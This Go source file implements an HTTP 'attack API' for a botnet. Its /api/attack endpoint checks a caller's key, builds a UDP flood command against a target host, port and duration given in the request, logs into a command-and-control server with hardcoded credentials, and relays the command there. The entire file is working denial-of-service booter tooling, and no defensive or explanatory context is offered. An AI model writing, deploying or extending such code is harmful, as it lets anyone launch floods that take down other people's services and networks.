package main

import (
	"fmt"
	"log"
	"net"
	"net/http"
)

var activeKeys = make(map[string]bool)

func handler(w http.ResponseWriter, r *http.Request) {
	server := "192.168.1.14"
	conport := "7071"
	username := "api"
	password := "api"

	key := r.URL.Query().Get("key")
	target := r.URL.Query().Get("host")
	port := r.URL.Query().Get("port")
	time := r.URL.Query().Get("time")
	method := r.URL.Query().Get("method")

	if !activeKeys[key] {
		fmt.Fprint(w, "Invalid key")
		return
	}

	var command string

	switch method {
	case "udp":
		command = fmt.Sprintf("./udp %s %s dport=%s", target, time, port)
		fmt.Fprint(w, "Attack Sent!")
		println("./UDP attack sent.")
	case "Method2":
		command = fmt.Sprintf("./other_command %s %s %s", target, port, time)
		println("./UDP attack sent.")
	default:
		fmt.Fprint(w, "Invalid method")
		return
	}

	sock, err := net.Dial("tcp", server+":"+conport)
	if err != nil {
		fmt.Fprint(w, "Couldn't connect to CNC Server...")
		return
	}

	buf := make([]byte, 512)
	n, err := sock.Read(buf)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprintln(w, string(buf[:n]))

	_, err = sock.Write([]byte(username + "\n"))
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprintln(w)

	n, err = sock.Read(buf)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprintln(w, string(buf[:n]))

	_, err = sock.Write([]byte(password + "\n"))
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	fmt.Fprintln(w)

	n, err = sock.Read(buf)
	if err != nil {
		fmt.Fprint(w, err)
		return
	}
	if n > 0 {
		fmt.Fprintln(w, string(buf[:n]))
	}

	_, err = sock.Write([]byte(command + "\n"))
	if err != nil {
		fmt.Fprint(w, err)
		return
	}

	sock.Close()
	fmt.Fprintln(w)
	fmt.Fprintf(w, "%s@botnet> %s", username, command)
	println(command)
}

func main() {
	// Populate the active keys
	activeKeys["key1"] = true
	activeKeys["key2"] = true
	println("API Started on https://localhost:8080/api/attack?key=")

	http.HandleFunc("/api/attack", handler)
	log.Fatal(http.ListenAndServe(":8080", nil))
}
